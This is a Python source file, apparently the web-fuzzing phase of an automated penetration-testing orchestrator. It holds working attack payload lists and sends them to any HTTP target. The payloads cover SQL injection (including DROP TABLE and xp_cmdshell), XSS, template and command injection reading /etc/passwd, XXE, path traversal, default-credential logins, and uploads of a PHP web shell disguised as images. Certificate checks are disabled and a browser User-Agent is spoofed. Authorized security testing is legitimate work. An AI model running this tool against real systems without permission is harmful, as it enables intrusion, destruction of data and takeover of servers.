import asyncio
import base64
import hashlib
import json
import logging
import random
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

from orchestrator.brain.phases.models import Finding, PhaseResult, Severity

try:
    import requests as _requests
    _REQUESTS_AVAILABLE = True
except ImportError:
    _REQUESTS_AVAILABLE = False
    _requests = None

logger = logging.getLogger("phase_web_fuzz")

SQLI_PAYLOADS = [
    "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1",
    "'; DROP TABLE users--", "1' UNION SELECT NULL--",
    "' UNION SELECT 1,2,3,4,5--", "' AND 1=1--", "' AND 1=2--",
    "' OR 1=1#", "\" OR 1=1#", "' OR '1'='1'--",
    "admin'--", "admin' #", "admin'/*",
    "' OR 'x'='x", "\" OR \"x\"=\"x",
    "1' WAITFOR DELAY '0:0:5'--", "1; WAITFOR DELAY '0:0:5'--",
    "1 AND SLEEP(5)--", "1' AND SLEEP(5)--",
    "'; EXEC xp_cmdshell('whoami')--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "'\"><script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "`><script>alert(1)</script>",
    "<svg/onload=alert`1`>",
    "<details open ontoggle=alert(1)>",
    "<math><maction actiontype=\"statusline#\" xlink:href=\"javascript:alert(1)\">click</maction></math>",
]

SSTI_PAYLOADS = [
    "{{7*7}}", "${7*7}", "#{7*7}", "*{7*7}",
    "{{config}}", "{{self}}", "{{request}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
]

CMD_INJECTION_PAYLOADS = [
    ";id", "|id", "`id`", "$(id)",
    "; whoami", "| whoami", "`whoami`", "$(whoami)",
    "&& id", "|| id",
    "; cat /etc/passwd", "| cat /etc/passwd",
    "`cat /etc/passwd`", "$(cat /etc/passwd)",
    "; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)",
    "& ping -c 1 127.0.0.1",
]

LDAP_PAYLOADS = [
    "*)(|(userPassword=*))", "*))(|(userPassword=*))",
    "*)(cn=*))", "*)(|(cn=*))",
]

XXE_PAYLOADS = [
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>""",
    """<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>""",
]

NO_SQL_PAYLOADS = [
    '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}',
    '{"$where": "1==1"}', '{"$where": "sleep(1000)"}',
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "....//....//....//etc/passwd", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%2f..%2f..%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
    "/var/www/../../etc/passwd", "/var/www/html/../../etc/passwd",
]

FILE_UPLOAD_PAYLOADS = [
    ("shell.php", "<?php system($_GET['c']); ?>", "image/png"),
    ("shell.php.png", "<?php system($_GET['c']); ?>", "image/png"),
    ("shell.phtml", "<?php system($_GET['c']); ?>", "image/png"),
    ("shell.php5", "<?php system($_GET['c']); ?>", "image/png"),
    ("shell.phar", "<?php system($_GET['c']); ?>", "image/png"),
    ("shell.php%00.png", "<?php system($_GET['c']); ?>", "image/png"),
    ("shell.php\x00.png", "<?php system($_GET['c']); ?>", "image/png"),
    ("shell.jpg", "<?php system($_GET['c']); ?>\x00\x00\x00\x00", "image/jpeg"),
]

AUTH_BYPASS_PAYLOADS = [
    {"username": "admin", "password": "' OR '1'='1"},
    {"username": "admin'--", "password": "anything"},
    {"username": "admin' #", "password": "anything"},
    {"username": "admin'/*", "password": "anything"},
    {"username": "' OR 1=1--", "password": "' OR 1=1--"},
    {"username": "admin", "password": "admin"},
    {"username": "administrator", "password": "administrator"},
    {"username": "root", "password": "root"},
    {"username": "test", "password": "test"},
    {"username": "guest", "password": "guest"},
]


@dataclass
class FuzzResult:
    url: str
    param: str
    payload: str
    vulnerability_type: str
    evidence: str
    response_code: int
    response_length: int
    response_time: float
    confidence: float


async def run_web_fuzz(target: str, findings: list[Finding] = None) -> PhaseResult:
    t0 = time.time()
    all_findings = list(findings or [])
    errors = []

    http_targets = _extract_http_targets(all_findings, target)
    if not http_targets:
        return PhaseResult(
            phase="web_fuzz",
            success=False,
            findings=all_findings,
            summary="No HTTP targets found for fuzzing",
            latency=time.time() - t0,
            error="No HTTP targets",
        )

    fuzz_results = []
    for base_url in http_targets:
        logger.info(f"  [WebFuzz] Fuzzing {base_url}")

        try:
            param_results = await _fuzz_parameters(base_url, all_findings)
            fuzz_results.extend(param_results)

            auth_results = await _fuzz_auth_bypass(base_url)
            fuzz_results.extend(auth_results)

            upload_results = await _fuzz_file_upload(base_url)
            fuzz_results.extend(upload_results)

            path_results = await _fuzz_path_traversal(base_url)
            fuzz_results.extend(path_results)
        except Exception as e:
            logger.warning(f"  [WebFuzz] {base_url} error: {e}")
            errors.append(f"{base_url}: {e}")

    for res in fuzz_results:
        sev = _severity_for_type(res.vulnerability_type)
        all_findings.append(Finding(
            phase="web_fuzz",
            type=res.vulnerability_type,
            target=target,
            host=target,
            severity=sev,
            description=f"{res.vulnerability_type.upper()} in {res.param} at {res.url}",
            evidence=f"Payload: {res.payload[:100]} | Response: {res.evidence[:200]}",
            payload=res.payload,
            raw={
                "url": res.url,
                "param": res.param,
                "payload": res.payload,
                "type": res.vulnerability_type,
                "status_code": res.response_code,
                "response_length": res.response_length,
                "response_time": res.response_time,
                "confidence": res.confidence,
            },
        ))

    latency = time.time() - t0
    vuln_types = set(r.vulnerability_type for r in fuzz_results)
    return PhaseResult(
        phase="web_fuzz",
        success=len(fuzz_results) > 0,
        findings=all_findings,
        summary=f"Web fuzzing: {len(fuzz_results)} findings ({', '.join(vuln_types) if vuln_types else 'none'})",
        latency=latency,
        error="; ".join(errors) if errors else None,
    )


def _extract_http_targets(findings: list[Finding], target: str) -> list[str]:
    targets = set()
    for f in findings or []:
        if f.port and f.port in (80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9000):
            scheme = "https" if f.port in (443, 8443) else "http"
            targets.add(f"{scheme}://{target}:{f.port}")
        if f.service in ("http", "https", "http-proxy", "http-alt", "https-alt"):
            if f.port:
                scheme = "https" if f.port in (443, 8443) else "http"
                targets.add(f"{scheme}://{target}:{f.port}")
    if not targets:
        targets.add(f"http://{target}")
        targets.add(f"https://{target}")
    return list(targets)


async def _fuzz_parameters(base_url: str, findings: list[Finding]) -> list[FuzzResult]:
    results = []
    if not _REQUESTS_AVAILABLE:
        return results

    session = _requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/131.0"})

    try:
        r = session.get(base_url, timeout=10, allow_redirects=True)
        html = r.text
        forms = _extract_forms(html, base_url)
        params = _extract_params(html, base_url)

        all_params = {}
        for form in forms:
            for inp in form.get("inputs", []):
                if inp.get("name"):
                    all_params[f"{form['action']}:{inp['name']}"] = inp["name"]
        for p in params:
            all_params[p] = p

        if not all_params:
            all_params = {"q": "q", "search": "search", "id": "id", "page": "page"}

        for param_key, param_name in list(all_params.items())[:15]:
            for payload in SQLI_PAYLOADS:
                result = await _test_param(session, base_url, param_name, payload, "sqli")
                if result:
                    results.append(result)
                    break
            for payload in XSS_PAYLOADS:
                result = await _test_param(session, base_url, param_name, payload, "xss")
                if result:
                    results.append(result)
                    break
            for payload in CMD_INJECTION_PAYLOADS[:6]:
                result = await _test_param(session, base_url, param_name, payload, "cmdi")
                if result:
                    results.append(result)
            for payload in SSTI_PAYLOADS[:4]:
                result = await _test_param(session, base_url, param_name, payload, "ssti")
                if result:
                    results.append(result)
            for payload in LDAP_PAYLOADS[:2]:
                result = await _test_param(session, base_url, param_name, payload, "ldap_injection")
                if result:
                    results.append(result)
            for payload in XXE_PAYLOADS[:1]:
                result = await _test_xxe(session, base_url, param_name, payload)
                if result:
                    results.append(result)
            for payload in NO_SQL_PAYLOADS[:3]:
                result = await _test_nosql(session, base_url, param_name, payload)
                if result:
                    results.append(result)

            await asyncio.sleep(0.1)
    except Exception as e:
        logger.debug(f"Param fuzzing error for {base_url}: {e}")

    return results


async def _test_param(session, base_url: str, param: str, payload: str, vuln_type: str) -> Optional[FuzzResult]:
    try:
        encoded = urllib.parse.quote(payload)
        test_url = f"{base_url}?{param}={encoded}"

        t0 = time.time()
        r = session.get(test_url, timeout=8, allow_redirects=False)
        elapsed = time.time() - t0

        evidence = _check_vulnerability(r, payload, vuln_type, elapsed)
        if evidence:
            return FuzzResult(
                url=base_url, param=param, payload=payload,
                vulnerability_type=vuln_type, evidence=evidence,
                response_code=r.status_code, response_length=len(r.content),
                response_time=elapsed, confidence=0.7,
            )
    except Exception:
        logger.debug("Non-critical error", exc_info=True)
    return None


async def _test_xxe(session, base_url: str, param: str, payload: str) -> Optional[FuzzResult]:
    try:
        headers = {"Content-Type": "application/xml"}
        t0 = time.time()
        r = session.post(f"{base_url}?{param}=", data=payload, headers=headers, timeout=10)
        elapsed = time.time() - t0

        if "root:" in r.text or "daemon:" in r.text or "etc/passwd" in r.text:
            return FuzzResult(
                url=base_url, param=param, payload=payload,
                vulnerability_type="xxe", evidence=r.text[:300],
                response_code=r.status_code, response_length=len(r.content),
                response_time=elapsed, confidence=0.8,
            )
    except Exception:
        logger.debug("Non-critical error", exc_info=True)
    return None


async def _test_nosql(session, base_url: str, param: str, payload: str) -> Optional[FuzzResult]:
    try:
        headers = {"Content-Type": "application/json"}
        t0 = time.time()
        r = session.post(f"{base_url}", json={param: json.loads(payload)}, timeout=8)
        elapsed = time.time() - t0

        if r.status_code == 200 and ("user" in r.text.lower() or "admin" in r.text.lower() or "token" in r.text.lower()):
            return FuzzResult(
                url=base_url, param=param, payload=payload,
                vulnerability_type="nosql_injection", evidence=r.text[:300],
                response_code=r.status_code, response_length=len(r.content),
                response_time=elapsed, confidence=0.6,
            )
    except Exception:
        logger.debug("Non-critical error", exc_info=True)
    return None


def _check_vulnerability(response, payload: str, vuln_type: str, elapsed: float) -> Optional[str]:
    text = response.text
    code = response.status_code

    if vuln_type == "sqli":
        sql_errors = [
            "sql syntax", "mysql_fetch", "ora-01756", "ora-00933",
            "postgresql.*error", "syntax error", "unclosed quotation",
            "pg_query", "sqlite3.OperationalError", "SQLSTATE",
        ]
        for err in sql_errors:
            if err in text.lower():
                return f"SQL error detected: {err}"
        if elapsed > 4.5:
            return f"Time-based blind SQLi (delay: {elapsed:.1f}s)"

    elif vuln_type == "xss":
        xss_indicators = ["<script>", "onerror=", "onload=", "onfocus=", "onmouseover",
                          "onclick=", "onkeydown=", "ontoggle=", "onscroll=",
                          "<svg/onload", "<body on", "<details ontoggle", "<img src=x"]
        if payload in text and any(ind in payload.lower() for ind in xss_indicators):
            return f"Reflected XSS payload in response"
        if "alert(" in text.lower() or "prompt(" in text.lower() or "confirm(" in text.lower():
            return f"XSS payload executed"

    elif vuln_type == "cmdi":
        cmd_outputs = ["uid=", "gid=", "root:", "bin/bash", "bin/sh", "windows\\system32"]
        for out in cmd_outputs:
            if out in text.lower():
                return f"Command output detected: {out}"

    elif vuln_type == "ssti":
        if "49" in text and "{{7*7}}" in payload:
            return "SSTI: template expression evaluated (49)"
        if "config" in text.lower() or "self" in text.lower():
            return "SSTI: template context leaked"

    elif vuln_type == "ldap_injection":
        if len(text) > 1000 and code == 200:
            return "LDAP injection: large response"

    return None


def _extract_forms(html: str, base_url: str) -> list[dict]:
    forms = []
    form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.I | re.DOTALL)
    for match in form_pattern.finditer(html):
        form_html = match.group(0)
        action = re.search(r'action\s*=\s*["\']([^"\']*)["\']', form_html, re.I)
        method = re.search(r'method\s*=\s*["\']([^"\']*)["\']', form_html, re.I)
        inputs = []
        for inp in re.finditer(r'<input[^>]*>', form_html, re.I):
            inp_html = inp.group(0)
            name = re.search(r'name\s*=\s*["\']([^"\']*)["\']', inp_html, re.I)
            type_ = re.search(r'type\s*=\s*["\']([^"\']*)["\']', inp_html, re.I)
            if name:
                inputs.append({"name": name.group(1), "type": type_.group(1) if type_ else "text"})
        forms.append({
            "action": urllib.parse.urljoin(base_url, action.group(1)) if action else base_url,
            "method": (method.group(1) if method else "GET").upper(),
            "inputs": inputs,
        })
    return forms


def _extract_params(html: str, base_url: str) -> list[str]:
    params = set()
    for match in re.finditer(r'[?&]([a-zA-Z0-9_]+)=', html):
        params.add(match.group(1))
    return list(params)


async def _fuzz_auth_bypass(base_url: str) -> list[FuzzResult]:
    results = []
    if not _REQUESTS_AVAILABLE:
        return results

    session = _requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": "Mozilla/5.0"})

    login_paths = ["/login", "/admin/login", "/signin", "/auth", "/wp-login.php",
                   "/administrator", "/manager/html", "/phpmyadmin"]

    for path in login_paths:
        url = urllib.parse.urljoin(base_url, path)
        try:
            r = session.get(url, timeout=5)
            forms = _extract_forms(r.text, url)
            for form in forms:
                for payload in AUTH_BYPASS_PAYLOADS[:5]:
                    data = {k: v for k, v in payload.items() if k in [i["name"] for i in form["inputs"]]}
                    if not data:
                        continue
                    try:
                        t0 = time.time()
                        if form["method"] == "POST":
                            resp = session.post(form["action"], data=data, timeout=8, allow_redirects=True)
                        else:
                            resp = session.get(form["action"], params=data, timeout=8, allow_redirects=True)
                        elapsed = time.time() - t0

                        if resp.status_code in (200, 302) and ("dashboard" in resp.text.lower() or
                            "admin" in resp.text.lower() or "logout" in resp.text.lower() or
                            len(resp.history) > 0):
                            results.append(FuzzResult(
                                url=url, param="login_form", payload=str(payload),
                                vulnerability_type="auth_bypass", evidence=f"Login bypassed, redirected to {resp.url}",
                                response_code=resp.status_code, response_length=len(resp.content),
                                response_time=elapsed, confidence=0.8,
                            ))
                    except Exception:
                        logger.debug("Non-critical error", exc_info=True)
        except Exception:
            logger.debug("Non-critical error", exc_info=True)
        await asyncio.sleep(0.1)
    return results


async def _fuzz_file_upload(base_url: str) -> list[FuzzResult]:
    results = []
    if not _REQUESTS_AVAILABLE:
        return results

    session = _requests.Session()
    session.verify = False

    upload_paths = ["/upload", "/upload.php", "/admin/upload", "/api/upload",
                    "/file/upload", "/media/upload", "/uploader"]

    for path in upload_paths:
        url = urllib.parse.urljoin(base_url, path)
        try:
            r = session.get(url, timeout=5)
            forms = _extract_forms(r.text, url)
            for form in forms:
                file_inputs = [i for i in form["inputs"] if i.get("type") == "file"]
                if not file_inputs:
                    continue
                for fname, content, mime in FILE_UPLOAD_PAYLOADS[:3]:
                    try:
                        files = {file_inputs[0]["name"]: (fname, content, mime)}
                        t0 = time.time()
                        resp = session.post(form["action"], files=files, timeout=10)
                        elapsed = time.time() - t0

                        if resp.status_code in (200, 201) and ("success" in resp.text.lower() or
                            "upload" in resp.text.lower() or fname in resp.text):
                            results.append(FuzzResult(
                                url=url, param=file_inputs[0]["name"], payload=fname,
                                vulnerability_type="file_upload", evidence=resp.text[:300],
                                response_code=resp.status_code, response_length=len(resp.content),
                                response_time=elapsed, confidence=0.7,
                            ))
                    except Exception:
                        logger.debug("Non-critical error", exc_info=True)
        except Exception:
            logger.debug("Non-critical error", exc_info=True)
        await asyncio.sleep(0.1)
    return results


async def _fuzz_path_traversal(base_url: str) -> list[FuzzResult]:
    results = []
    if not _REQUESTS_AVAILABLE:
        return results

    session = _requests.Session()
    session.verify = False

    params = ["file", "path", "page", "include", "doc", "document", "template", "view"]

    for param in params:
        for payload in PATH_TRAVERSAL_PAYLOADS[:8]:
            try:
                test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
                t0 = time.time()
                r = session.get(test_url, timeout=8)
                elapsed = time.time() - t0

                if "root:" in r.text or "daemon:" in r.text or "bin/bash" in r.text or \
                   "windows\\system32" in r.text.lower() or "hosts" in r.text.lower():
                    results.append(FuzzResult(
                        url=base_url, param=param, payload=payload,
                        vulnerability_type="path_traversal", evidence=r.text[:300],
                        response_code=r.status_code, response_length=len(r.content),
                        response_time=elapsed, confidence=0.85,
                    ))
            except Exception:
                logger.debug("Non-critical error", exc_info=True)
            await asyncio.sleep(0.05)
    return results


def _severity_for_type(vuln_type: str) -> Severity:
    mapping = {
        "sqli": Severity.CRITICAL,
        "cmdi": Severity.CRITICAL,
        "xxe": Severity.CRITICAL,
        "auth_bypass": Severity.CRITICAL,
        "file_upload": Severity.HIGH,
        "path_traversal": Severity.HIGH,
        "xss": Severity.HIGH,
        "ssti": Severity.HIGH,
        "ldap_injection": Severity.HIGH,
        "nosql_injection": Severity.HIGH,
    }
    return mapping.get(vuln_type, Severity.MEDIUM)
